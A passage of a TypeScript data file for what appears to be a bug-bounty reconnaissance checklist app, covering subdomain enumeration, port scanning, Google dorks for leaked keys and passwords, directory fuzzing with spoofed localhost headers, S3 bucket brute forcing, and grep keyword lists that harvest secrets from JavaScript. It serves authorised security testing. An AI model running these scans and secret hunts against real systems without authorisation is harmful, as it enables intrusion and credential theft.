export interface ChecklistTask {
  id: string;
  label: string;
}

export interface CodeSnippet {
  title: string;
  code: string;
}

export interface SubSection {
  id: string;
  title: string;
  estimatedTime?: string;
  tasks: ChecklistTask[];
  codeSnippets?: CodeSnippet[];
  manualChecks?: string[];
}

export interface Phase {
  id: string;
  title: string;
  description: string;
  estimatedTime: string;
  subSections: SubSection[];
}

export const checklistData: Phase[] = [
  {
    id: 'scope-analysis',
    title: 'Scope Analysis & Authorization',
    description: 'Thorough analysis of program scope and legal boundaries',
    estimatedTime: '20 minutes',
    subSections: [
      {
        id: 'program-research',
        title: 'Program Research',
        estimatedTime: '10 minutes',
        tasks: [
          { id: 'pr-1', label: 'Read the bug bounty program policy completely' },
          { id: 'pr-2', label: 'List all in-scope domains, IPs, and applications' },
          { id: 'pr-3', label: 'Document out-of-scope items and restrictions' },
          { id: 'pr-4', label: 'Check existing reports and known issues' },
          { id: 'pr-5', label: 'Note program contact details for clarification' },
        ],
      },
      {
        id: 'platform-checks',
        title: 'Platform-Specific Checks',
        estimatedTime: '10 minutes',
        tasks: [
          { id: 'pc-1', label: 'Check HackerOne program details' },
          { id: 'pc-2', label: 'Check Bugcrowd program details' },
          { id: 'pc-3', label: 'Check Intigriti program details' },
          { id: 'pc-4', label: 'Check YesWeHack program details' },
          { id: 'pc-5', label: 'Check eligibility for private programs' },
        ],
      },
    ],
  },
  {
    id: 'passive-intelligence',
    title: 'Passive Intelligence Gathering',
    description: 'Stealthy information gathering without direct target interaction',
    estimatedTime: '100 minutes',
    subSections: [
      {
        id: 'domain-intelligence',
        title: 'Phase 1: Domain Intelligence',
        estimatedTime: '45 minutes',
        tasks: [
          { id: 'di-1', label: 'Perform passive subdomain enumeration (stealthy)' },
          { id: 'di-2', label: 'Clean duplicates and validate subdomains' },
          { id: 'di-3', label: 'Look for development/staging environments (staging.target.com, dev.target.com)' },
          { id: 'di-4', label: 'Find admin interfaces (admin.target.com, panel.target.com)' },
          { id: 'di-5', label: 'Discover API endpoints (api.target.com, api-v2.target.com)' },
          { id: 'di-6', label: 'Find old/legacy systems (old.target.com, legacy.target.com)' },
          { id: 'di-7', label: 'Check geographic variations (us.target.com, eu.target.com)' },
        ],
        codeSnippets: [
          {
            title: 'Multi Tool Subdomain Discovery',
            code: `subfinder -d target.com -all -recursive -o subfinder.txt
assetfinder --subs-only target.com > assetfinder.txt
findomain -t target.com -u findomain.txt
amass enum -passive -d target.com | grep '(FQDN)' | cut -d ' ' -f1 | sort -u | grep target.com > amass.txt
shodanx subdomain -d target.com -o shodanx.txt

# Advanced subdomain discovery
chaos -d target.com -o chaos.txt
github-subdomains -d target.com -t github_token -o github-subs.txt`,
          },
          {
            title: 'Certificate Transparency Mining',
            code: `curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u > crt_subdomains.txt
curl -s "https://crt.sh/?q=target.com&output=json" | jq -r '.[] | select(.not_after > "2023-01-01") | .name_value' | sort -u
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].issuer_name' | sort | uniq -c | sort -nr`,
          },
          {
            title: 'Advanced Subdomain Discovery',
            code: `# Alterx ProjectDiscovery: Permutation Based
echo "target.com" | alterx > alterx.txt
echo "target.com" | alterx -silent -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt | dnsx -silent > alterx.txt

# Passive / Historic subdomain : AlienVault
curl -s "https://otx.alienvault.com/api/v1/indicators/domain/target.com/passive_dns" | jq -r '.passive_dns[].hostname' | sort -u > alien_vault.txt

# Passive / Historic Subdomain : Wayback
curl -s "https://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original" | cut -d/ -f3 | sort -u | tee wayback.txt

# Combine and clean results
cat *.txt | sort -u | tee all_subdomains.txt
echo "Found $(wc -l < all_subdomains.txt) unique subdomains"

# Live Targets
httpx -l all_subdomains.txt -o passive_subdomains.txt -silent`,
          },
        ],
        manualChecks: [
          'Certificate Transparency: https://crt.sh/?q=%25.target.com',
          'VirusTotal: https://www.virustotal.com/gui/domain/target.com/relations',
          'SecurityTrails: https://securitytrails.com/domain/target.com/dns',
          'FOFA: https://fofa.so (search: domain="target.com")',
          'Censys: https://search.censys.io/search?q=names:target.com',
          'DNSdumpster: https://dnsdumpster.com',
          'Netcraft: https://searchdns.netcraft.com',
        ],
      },
      {
        id: 'asset-discovery',
        title: 'Phase 2: Asset Discovery & Enrichment',
        estimatedTime: '60 minutes',
        tasks: [
          { id: 'ad-1', label: 'Perform comprehensive DNS enumeration' },
          { id: 'ad-2', label: 'Gather WHOIS and registration intelligence' },
          { id: 'ad-3', label: 'Identify ASN and IP ranges' },
          { id: 'ad-4', label: 'Execute advanced Google dorking campaigns' },
          { id: 'ad-5', label: 'Use alternative search engines (Bing, DuckDuckGo, Yandex)' },
          { id: 'ad-6', label: 'Conduct social media and OSINT research' },
          { id: 'ad-7', label: 'Enumerate employees and technology stack via LinkedIn' },
          { id: 'ad-8', label: 'Search GitHub for organization repositories and secrets' },
        ],
        codeSnippets: [
          {
            title: 'Advanced DNS Enumeration',
            code: `dnsx -l all_subdomains.txt -resp -a -aaaa -cname -mx -ns -txt -ptr -srv
dnsrecon -d target.com -t axfr,brt,srv,std
fierce --domain target.com --subdomains subdomains.txt

# DNS bruteforce with custom wordlists
puredns bruteforce best-dns-wordlist.txt target.com -r resolvers.txt
shuffledns -d target.com -w subdomains.txt -r resolvers.txt`,
          },
          {
            title: 'WHOIS & Registration Intelligence',
            code: `whois target.com | grep -E "(Registrant|Admin|Tech|Email)"
amass intel -d target.com -whois

# For multiple targets
while read -r d; do echo "\\nDomain: $d\\n"; whois "$d"; done < passive_subdomains.txt`,
          },
          {
            title: 'ASN Recon',
            code: `# Find IP first of any domain
dig +short target.com
host target.com

# Use Whois on that IP
whois <IP>

# Using whois with BGP info
whois -h whois.cymru.com " -v <IP>"

# Online Tools
# https://ipinfo.io/
# https://bgp.he.net/
# https://radar.qrator.net/

echo "AS15169" | mapcidr -silent -sbc 10 -output cidr-ranges.txt

# Query route objects from ASN
whois -h whois.radb.net -- '-i origin AS14618' | grep -oE '([0-9]{1,3}.){3}[0-9]{1,3}/[0-9]{1,2}' | sort -u | tee cidr-ranges.txt

# Expand CIDR ranges into individual IPs
cat cidr-ranges.txt | xargs -n1 prips | tee all-ips.txt`,
          },
          {
            title: 'Google Dorking Automation',
            code: `DOMAIN="target.com"

# Login & Admin Pages
site:target.com inurl:admin
site:target.com inurl:login
site:target.com inurl:signin | inurl:signup
site:target.com intitle:"login" | intitle:"sign in"
site:target.com inurl:dashboard | inurl:portal | inurl:cpanel

# Configuration Files & Secrets
site:target.com ext:env | ext:ini | ext:cnf | ext:config
site:target.com ext:json | ext:yaml | ext:yml
site:target.com intext:"DB_PASSWORD" | intext:"DB_USER"
site:target.com intext:"api_key" | intext:"secret" | intext:"access_token"
site:target.com "PRIVATE KEY" | "BEGIN RSA PRIVATE"

# Backup & Old Files
site:target.com ext:bak | ext:old | ext:backup
site:target.com ext:zip | ext:tar | ext:gz | ext:7z
site:target.com intitle:"index of" "backup"

# Database & Credentials
site:target.com ext:sql | ext:db | ext:sqlite
site:target.com filetype:csv | filetype:xls | filetype:xlsx
site:target.com intext:"password=" | intext:"username="

# Error Messages & Debug Info
site:target.com inurl:error | inurl:debug
site:target.com intext:"syntax error" | intext:"stack trace"
site:target.com intext:"Fatal error" | intext:"Warning:"

# API & Web Services
site:target.com inurl:api | inurl:graphql | inurl:rest
site:target.com intext:"swagger-ui" | intitle:"API Documentation"

# Advanced Dorks
site:target.com inurl:"/.git" | inurl:"/.svn"
site:target.com intitle:"phpinfo()" "PHP Version"
site:target.com inurl:/phpmyadmin | inurl:/pma
cache:target.com`,
          },
        ],
      },
      {
        id: 'historical-intelligence',
        title: 'Phase 3: Historical Intelligence',
        estimatedTime: '30 minutes',
        tasks: [
          { id: 'hi-1', label: 'Comprehensive Wayback Machine analysis' },
          { id: 'hi-2', label: 'Discover historical subdomains' },
          { id: 'hi-3', label: 'Extract archived endpoints and parameters' },
          { id: 'hi-4', label: 'Track technology stack evolution' },
          { id: 'hi-5', label: 'Find deprecated but potentially accessible endpoints' },
          { id: 'hi-6', label: 'Identify historical misconfigurations' },
        ],
        codeSnippets: [
          {
            title: 'Historical Data Mining',
            code: `# Comprehensive historical URL gathering
waybackurls target.com | tee wayback_urls.txt
gau target.com --blacklist png,jpg,gif,css | tee gau_urls.txt
waymore -i target.com --mode U --output-urls waymore_urls.txt

# Historical subdomain discovery
waybackurls target.com | unfurl domains | sort -u | tee historical_subdomains.txt

# Parameter extraction from archived URLs
cat wayback_urls.txt | unfurl keys | sort -u | tee parameters.txt
cat wayback_urls.txt | grep -E "\\?.*=" | unfurl keys | sort -u >> parameters.txt`,
          },
        ],
      },
    ],
  },
  {
    id: 'active-recon',
    title: 'Active Reconnaissance',
    description: 'Direct target interaction for infrastructure mapping and service discovery',
    estimatedTime: '105 minutes',
    subSections: [
      {
        id: 'infrastructure-mapping',
        title: 'Phase 4: Infrastructure Mapping',
        estimatedTime: '45 minutes',
        tasks: [
          { id: 'im-1', label: 'Map ASN and IP ranges comprehensively' },
          { id: 'im-2', label: 'Fast port discovery across all assets' },
          { id: 'im-3', label: 'Detailed service enumeration' },
          { id: 'im-4', label: 'Investigate SSH services (Port 22)' },
          { id: 'im-5', label: 'Investigate FTP services (Port 21)' },
          { id: 'im-6', label: 'Investigate web services (80/443)' },
          { id: 'im-7', label: 'Investigate alternative web ports (8080/8443)' },
          { id: 'im-8', label: 'Investigate database ports (3306, 5432, 1433)' },
          { id: 'im-9', label: 'Investigate cache services (6379 Redis, 11211 Memcached)' },
          { id: 'im-10', label: 'Investigate Elasticsearch (9200)' },
        ],
        codeSnippets: [
          {
            title: 'Infrastructure Discovery Pipeline',
            code: `# ASN Discovery links
# https://hackertarget.com/as-ip-lookup/
# https://bgp.he.net/

echo "AS15169" | mapcidr -silent -sbc 10 -output cidr-ranges.txt
amass intel -d target.com -whois | grep -E "NetRange|CIDR" > ip_ranges.txt

# Fast port discovery
naabu -list passive_subdomains.txt -top-ports 1000 -o naabu_ports.txt
masscan -p1-65535 --rate=2000 -iL ip_list.txt -oG masscan_results.txt

# Shared Hosting check on IP
# https://rapiddns.io/s/181.224.133.81#result

# Service enumeration
nmap --script=http-enum,http-headers,http-methods,http-robots.txt -p80,443,8080,8443 -iL targets.txt
nmap -sV -sC -p- --min-rate=1000 -iL ip_list.txt -oX nmap_detailed.xml

# Convert to HTML
xsltproc nmap_detailed.xml nmap_detailed.html`,
          },
          {
            title: 'Active Subdomain',
            code: `# Run ffuf and save JSON
ffuf -u https://FUZZ.target.com -w subdomains.txt -mc 200,301,302,403 -t 100 -o ffuf_results.json -of json

# Extract matched URLs
jq -r '.results[]?.url' ffuf_results.json > active_subdomains.txt

# Merge with passive subdomain file
cat passive_subdomains.txt active_subdomains.txt > Live_subdomains.txt`,
          },
        ],
      },
      {
        id: 'http-discovery',
        title: 'Phase 5: HTTP/HTTPS Discovery & Analysis',
        estimatedTime: '30 minutes',
        tasks: [
          { id: 'hd-1', label: 'Comprehensive HTTP service probing' },
          { id: 'hd-2', label: 'Technology stack detection' },
          { id: 'hd-3', label: 'Security headers analysis' },
          { id: 'hd-4', label: 'Robots.txt and security.txt analysis' },
          { id: 'hd-5', label: 'Redirect chain analysis' },
          { id: 'hd-6', label: 'SSL/TLS configuration analysis' },
        ],
        codeSnippets: [
          {
            title: 'HTTP Analysis Pipeline',
            code: `# Tech Detection
httpx -list all_subdomains.txt -ports 80,443,8080,8443,3000,5000,8000,9000 -title -tech-detect -status-code -cname -o httpx_results.txt

# Browser Extension: Use wappalyzer extension manually

# WAF detection
wafw00f -i subdomains.txt -o waf-results.txt

# SSL/TLS analysis
testssl --quiet --color 0 --file httpx_results.txt`,
          },
        ],
      },
      {
        id: 'visual-recon',
        title: 'Phase 6: Visual Reconnaissance',
        estimatedTime: '30 minutes',
        tasks: [
          { id: 'vr-1', label: 'Collect screenshots of all web services' },
          { id: 'vr-2', label: 'Perform similarity analysis to group services' },
          { id: 'vr-3', label: 'Identify interesting pages and interfaces' },
          { id: 'vr-4', label: 'Catalog login portals and admin interfaces' },
          { id: 'vr-5', label: 'Analyze error pages for information disclosure' },
        ],
        codeSnippets: [
          {
            title: 'Visual Reconnaissance',
            code: `# Screenshot collection with multiple tools
aquatone -targets Live_subdomains.txt -out aquatone_screenshots
gowitness file -f Live_subdomains.txt --delay 2 --timeout 15

# Advanced screenshot analysis
cat Live_subdomains.txt | aquatone -screenshot-timeout 30000 -similarity 0.5`,
          },
        ],
      },
    ],
  },
  {
    id: 'deep-enumeration',
    title: 'Deep Enumeration',
    description: 'Comprehensive content discovery and application analysis',
    estimatedTime: '100 minutes',
    subSections: [
      {
        id: 'directory-discovery',
        title: 'Phase 7: Directory & File Discovery',
        estimatedTime: '75 minutes',
        tasks: [
          { id: 'dd-1', label: 'Multi-threaded directory brute forcing' },
          { id: 'dd-2', label: 'Use multi Ways to Parameter Fuzzing [katana, paramspider, arjun, gau, ffuf]' },
          { id: 'dd-3', label: 'Virtual Host Discovery [Vhost]' },
          { id: 'dd-4', label: 'File discovery with multiple extensions' },
          { id: 'dd-5', label: 'Technology-specific enumeration (WordPress, Drupal, etc.)' },
          { id: 'dd-6', label: 'Find administrative interfaces (/admin, /panel, /dashboard)' },
          { id: 'dd-7', label: 'Discover API endpoints (/api, /v1, /v2, /graphql)' },
          { id: 'dd-8', label: 'Find backup and source files (/backup, /.git, /.svn)' },
          { id: 'dd-9', label: 'Discover configuration files (/config, /.env)' },
          { id: 'dd-10', label: 'Find development artifacts (/test, /dev, /debug)' },
          { id: 'dd-11', label: 'Locate file upload functionality (/upload, /uploads)' },
          { id: 'dd-12', label: 'Find API documentation (/swagger, /docs)' },
        ],
        codeSnippets: [
          {
            title: 'Comprehensive Content Discovery',
            code: `# Extensions-based discovery
feroxbuster -u https://target.com -w common.txt --depth 3 -x php,html,js,txt,xml
ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.js,.txt,.xml,.json,.bak,.old,.tmp

# CMS-specific enumeration
ffuf -u https://target.com/FUZZ -w wp-dirs.txt # WordPress
ffuf -u https://target.com/FUZZ -w drupal-dirs.txt # Drupal

# Time-based discovery patterns
for year in {2020..2025}; do
  ffuf -u https://target.com/$year/FUZZ -w common.txt -mc 200,301,302,403
done`,
          },
          {
            title: 'URL & Parameter Fuzzing',
            code: `# Parameter fuzzing
paramspider -d target.com -o paramspider.txt
katana -d target.com -o katana.txt
arjun -u https://target.com --get --post
echo "target.com" | gau --o gau.txt

# Optional: Takes time but valuable
ffuf -u https://target.com/page?FUZZ=value -w parameters.txt
cat *.txt > Combine_Endpoint.txt`,
          },
          {
            title: 'Virtual Host Discovery',
            code: `# VHOST enumeration
vhostscan -i target_ip -w vhosts.txt -t target.com
gobuster vhost -u https://target.com -w subdomains.txt --append-domain
ffuf -w vhosts.txt -u https://target.com -H "Host: FUZZ.target.com" -mc 200`,
          },
        ],
      },
      {
        id: 'js-api-analysis',
        title: 'Phase 8: JavaScript & API Analysis',
        estimatedTime: '60 minutes',
        tasks: [
          { id: 'ja-1', label: 'Enumerate all JavaScript files' },
          { id: 'ja-2', label: 'Extract endpoints from JavaScript files' },
          { id: 'ja-3', label: 'Discover API endpoints and GraphQL schemas' },
          { id: 'ja-4', label: 'Scan for hardcoded secrets and API keys' },
          { id: 'ja-5', label: 'Identify DOM XSS sinks and dangerous functions' },
          { id: 'ja-6', label: 'Analyze AJAX endpoints and dynamic calls' },
          { id: 'ja-7', label: 'Identify WebSocket connections and protocols' },
          { id: 'ja-8', label: 'Analyze source maps for additional insights' },
        ],
        codeSnippets: [
          {
            title: 'JavaScript Analysis Pipeline',
            code: `# JavaScript file enumeration
getJS --input passive_subdomains.txt --complete | tee getJS.txt
subjs -i passive_subdomains.txt | tee subjs.txt

# Combine all JS endpoints
cat Combine_Endpoints.txt | grep -i ".js$" > Js_Endpoints.txt
cat getJS.txt subjs.txt >> Js_Endpoints.txt

# Secret scanning in JavaScript
cat js_files.txt | xargs -I {} curl -s {} | grep -E "(api_key|secret|password|token)" -i
nuclei -list js_files.txt -tags javascript,secret,token -c 100`,
          },
        ],
      },
    ],
  },
  {
    id: 'vuln-assessment',
    title: 'Vulnerability Assessment',
    description: 'Automated vulnerability scanning and security assessment',
    estimatedTime: '60 minutes',
    subSections: [
      {
        id: 'auto-vuln-scan',
        title: 'Phase 9: Automated Vulnerability Scanning',
        estimatedTime: '45 minutes',
        tasks: [
          { id: 'av-1', label: 'Run comprehensive Nuclei template scanning' },
          { id: 'av-2', label: 'Scan for known CVEs and security issues' },
          { id: 'av-3', label: 'WordPress-specific vulnerability scanning' },
          { id: 'av-4', label: 'Drupal-specific vulnerability scanning' },
          { id: 'av-5', label: 'CMS detection and vulnerability assessment' },
          { id: 'av-6', label: 'SSL/TLS vulnerability assessment' },
          { id: 'av-7', label: 'Subdomain takeover vulnerability scanning' },
        ],
        codeSnippets: [
          {
            title: 'Automated Vulnerability Scanning',
            code: `# Comprehensive Nuclei scanning
nuclei -list httpx_results.txt -t nuclei-templates/ -severity critical,high,medium -o nuclei_results.txt -c 100
nuclei -list httpx_results.txt -tags cve,rce,sqli,xss,lfi,ssrf -severity high,critical -c 100
nuclei -list js_files.txt -tags javascript,secret,exposure -c 100`,
          },
          {
            title: 'Technology-specific Scanning',
            code: `# WordPress Scanning
wpscan --url https://target.com --api-token YOUR_API_TOKEN --enumerate ap,at,u,m --detection-mode aggressive

# Drupal scanning
droopescan scan drupal -u https://target.com

# Joomla scanning
joomscan -u https://target.com

# CMS detection and scanning
cmseek -u https://target.com --batch --follow-redirect`,
          },
          {
            title: 'Subdomain Takeover',
            code: `# Remove http/https from file
sed -i 's#^http[s]?://##' clean_subdomains.txt

# Check CNAME chains recursively
while read -r d; do echo "=== $d ===";
  dig +short "$d" | tee -a all_records.txt
  dig +short NS "$d" | tee -a NS.txt
  dig +short CNAME "$d" | tee -a CNAME.txt
done < clean_subdomains.txt

# Use Subzy
subzy run --targets subdomains.txt --hide_fails --concurrency 20 --verify_ssl

# Use Subjack
subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl

# Use Nuclei
nuclei -l subdomains.txt -c 100 -t detect-all-takeovers.yaml

# Manual check resources:
# https://github.com/EdOverflow/can-i-take-over-xyz
# https://github.com/indianajson/can-i-take-over-dns`,
          },
        ],
      },
    ],
  },
  {
    id: 'advanced-techniques',
    title: 'Advanced Techniques',
    description: 'Cutting-edge reconnaissance techniques and methodologies',
    estimatedTime: '100 minutes',
    subSections: [
      {
        id: 'cloud-analysis',
        title: 'Cloud Infrastructure Analysis',
        estimatedTime: '60 minutes',
        tasks: [
          { id: 'ca-1', label: 'AWS service enumeration and bucket discovery' },
          { id: 'ca-2', label: 'Azure service enumeration and blob discovery' },
          { id: 'ca-3', label: 'Google Cloud Platform service discovery' },
          { id: 'ca-4', label: 'Container registry and orchestration discovery' },
          { id: 'ca-5', label: 'CDN configuration and origin server discovery' },
        ],
        codeSnippets: [
          {
            title: 'AWS Discovery',
            code: `# AWS enumeration
cat passive_subdomains.txt | xargs -I {} curl -s -I {} | grep -E "NoSuchBucket|InvalidBucketName"

# Gather S3 URLs
cat Combine_Endpoint.txt | grep -oE 'http[s]?://[^"]*.s3.amazon.com' | sort -u | tee source_s3.txt

# Check Tech
cat final_subdomain.txt | httpx -sc -title -td | grep "Amazon S3" | tee aws_tech.txt

# Nuclei Template
cat final_subdomain.txt | nuclei -t /home/user/.local/nuclei-templates/http/technologies/s3-detect.yaml -o nuclei_s3.txt

# Check DNS record
for sub in $(cat subdomains.txt); do
  dig +short CNAME $sub | grep -i "s3.amazonaws.com" | sed 's/.s3.*//g' >> buckets.txt
done
sort -u buckets.txt -o buckets.txt

# Brute Force Bucket name
cewl https://www.example.com/ -d 2 -w base.txt
s3scanner -bucket-file base.txt -o brute_buckets.txt -enumerate | grep -oE 'AllUsers: [.*(READ|WRITE|FULL).*]'

# s3scanner
s3scanner -l final_subdomain.txt -o s3scanner_s3.txt`,
          },
          {
            title: 'Azure Discovery',
            code: `# Azure enumeration
az storage blob list --account-name target --container-name files --auth-mode login`,
          },
          {
            title: 'Google Cloud Discovery',
            code: `# Google Cloud enumeration
gsutil ls -b gs://target-bucket`,
          },
          {
            title: 'Container & DevOps Intelligence',
            code: `# Docker registry enumeration
curl -s https://registry.target.com/v2/_catalog
docker-registry-scanner -u https://registry.target.com

# Kubernetes enumeration
kubectl --server=https://target.com:6443 get pods --all-namespaces`,
          },
        ],
      },
      {
        id: 'steganography',
        title: 'Steganography & Hidden Content',
        estimatedTime: '60 minutes',
        tasks: [
          { id: 'st-1', label: 'Extract metadata from images and documents' },
          { id: 'st-2', label: 'Analyze images for hidden data' },
          { id: 'st-3', label: 'Scan for embedded QR codes' },
          { id: 'st-4', label: 'Analyze multimedia files for hidden content' },
          { id: 'st-5', label: 'Deep analysis of compressed files' },
        ],
        codeSnippets: [
          {
            title: 'Metadata and Hidden Content Analysis',
            code: `# Image metadata extraction
exiftool *.jpg *.png *.gif
binwalk -e suspicious_file.jpg

# Document metadata
exiftool *.pdf *.docx *.xlsx
strings document.pdf | grep -i "password|secret|key"`,
          },
        ],
      },
    ],
  },
  {
    id: 'vuln-discovery',
    title: 'Vulnerability Discovery',
    description: 'Active vulnerability testing and exploitation techniques',
    estimatedTime: '180 minutes',
    subSections: [
      {
        id: 'nuclei-automation',
        title: 'Nuclei Automation',
        estimatedTime: '20 minutes',
        tasks: [
          { id: 'na-1', label: 'Run Nuclei with custom templates' },
          { id: 'na-2', label: 'Configure batch size and concurrency for speed' },
          { id: 'na-3', label: 'Scan for known CVEs and exposures' },
          { id: 'na-4', label: 'Use community template collections' },
        ],
        codeSnippets: [
          {
            title: 'Nuclei Scanning',
            code: `nuclei -u https://target.com -bs 50 -c 30
nuclei -l live_domains.txt -bs 50 -c 30

# Use batch size flag to set how many templates to run at once
# Concurrency flag defines how many domains to scan simultaneously

# Custom template collection:
# https://github.com/coffinxp/nuclei-templates`,
          },
        ],
      },
      {
        id: 'sensitive-files',
        title: 'Sensitive File Discovery',
        estimatedTime: '15 minutes',
        tasks: [
          { id: 'sf-1', label: 'Filter URLs for sensitive file extensions' },
          { id: 'sf-2', label: 'Check for backup files (.bak, .old, .backup)' },
          { id: 'sf-3', label: 'Look for configuration files (.config, .env, .yml)' },
          { id: 'sf-4', label: 'Search for database files (.sql, .db, .sqlite)' },
          { id: 'sf-5', label: 'Find document files (pdf, doc, xls)' },
        ],
        codeSnippets: [
          {
            title: 'Sensitive File Filtering',
            code: `cat allurls.txt | grep -E "\\.xls|\\.xml|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.txt|\\.zip|\\.tar\\.gz|\\.tgz|\\.bak|\\.7z|\\.rar|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.gz|\\.config|\\.csv|\\.yaml|\\.md|\\.md5"

cat allurls.txt | grep -E "\\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"`,
          },
          {
            title: 'Google Dork for Documents',
            code: `site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)`,
          },
        ],
      },
      {
        id: 'hidden-params',
        title: 'Hidden Parameter Discovery',
        estimatedTime: '20 minutes',
        tasks: [
          { id: 'hp-1', label: 'Run passive parameter discovery with Arjun' },
          { id: 'hp-2', label: 'Perform active parameter fuzzing' },
          { id: 'hp-3', label: 'Test both GET and POST methods' },
          { id: 'hp-4', label: 'Use custom wordlists for parameter names' },
        ],
        codeSnippets: [
          {
            title: 'Arjun Parameter Discovery',
            code: `# Passive parameter discovery:
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"

# Active parameter discovery with wordlist:
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"

# -oT sets output format to text
# -t 10 uses 10 threads
# --rate-limit 10 limits to 10 requests per second
# --passive enables passive discovery
# -m GET,POST tests both methods`,
          },
        ],
      },
      {
        id: 'dir-bruteforce',
        title: 'Directory & File Bruteforcing',
        estimatedTime: '30 minutes',
        tasks: [
          { id: 'db-1', label: 'Run Dirsearch with recursive mode' },
          { id: 'db-2', label: 'Use FFUF for high-speed fuzzing' },
          { id: 'db-3', label: 'Test multiple file extensions' },
          { id: 'db-4', label: 'Check for admin panels and backups' },
          { id: 'db-5', label: 'Identify development and debug endpoints' },
        ],
        codeSnippets: [
          {
            title: 'Dirsearch',
            code: `dirsearch -u https://example.com --full-url --deep-recursive -r

dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1`,
          },
          {
            title: 'FFUF Fuzzing',
            code: `ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0" -H "X-Forwarded-For: 127.0.0.1" -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-Host: localhost" -t 100 -r -o results.json

ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://target.com/FUZZ -fc 401,403,404 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf -ac -H "User-Agent: Mozilla/5.0" -r -t 60 --rate 100 -c

# Payloads: https://github.com/coffinxp/payloads`,
          },
        ],
      },
      {
        id: 'js-analysis-advanced',
        title: 'JavaScript Analysis (Advanced)',
        estimatedTime: '25 minutes',
        tasks: [
          { id: 'jsa-1', label: 'Hunt for JS files with Katana' },
          { id: 'jsa-2', label: 'Extract secrets and API keys from JS' },
          { id: 'jsa-3', label: 'Look for AWS keys, Firebase configs' },
          { id: 'jsa-4', label: 'Analyze for hardcoded credentials' },
          { id: 'jsa-5', label: 'Filter JS files by content type' },
        ],
        codeSnippets: [
          {
            title: 'JS File Hunting',
            code: `echo example.com | katana -d 3 | grep -E "\\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30

cat jsfiles.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"

cat allurls.txt | grep -E "\\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"`,
          },
          {
            title: 'Bulk JS Analysis',
            code: `echo domain.com | katana -ps -d 2 | grep -E "\\.js$" | nuclei -t /nuclei-templates/http/exposures/ -c 30

cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/`,
          },
          {
            title: 'Content-Type Filtering',
            code: `# HTML content Filtering
echo domain | gau | grep -Eo '(\\/[^\\/]+)\\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'

# JavaScript content Filtering
echo domain | gau | grep '\\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'`,
          },
        ],
      },
      {
        id: 'wordpress-testing',
        title: 'WordPress Security Testing',
        estimatedTime: '20 minutes',
        tasks: [
          { id: 'wp-1', label: 'Enumerate WordPress users' },
          { id: 'wp-2', label: 'Scan for vulnerable plugins' },
          { id: 'wp-3', label: 'Check for vulnerable themes' },
          { id: 'wp-4', label: 'Identify WordPress version' },
          { id: 'wp-5', label: 'Test for exposed admin panels' },
        ],
        codeSnippets: [
          {
            title: 'WPScan',
            code: `wpscan --url https://site.com --disable-tls-checks --api-token <YOUR_API_TOKEN> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force

# -e at: Enumerate all themes
# -e ap: Enumerate all plugins
# -e u: Enumerate users
# --plugins-detection aggressive: Aggressive plugin detection
# --force: Force scan even if WordPress not detected

# Fuzzing wordlist: https://github.com/coffinxp/payloads/blob/main/coffin%40wp-fuzz.txt`,
          },
        ],
      },
      {
        id: 'network-recon',
        title: 'Network-Level Recon',
        estimatedTime: '25 minutes',
        tasks: [
          { id: 'nr-1', label: 'Scan for open ports with Naabu' },
          { id: 'nr-2', label: 'Perform full Nmap scan' },
          { id: 'nr-3', label: 'Use Masscan for high-speed scanning' },
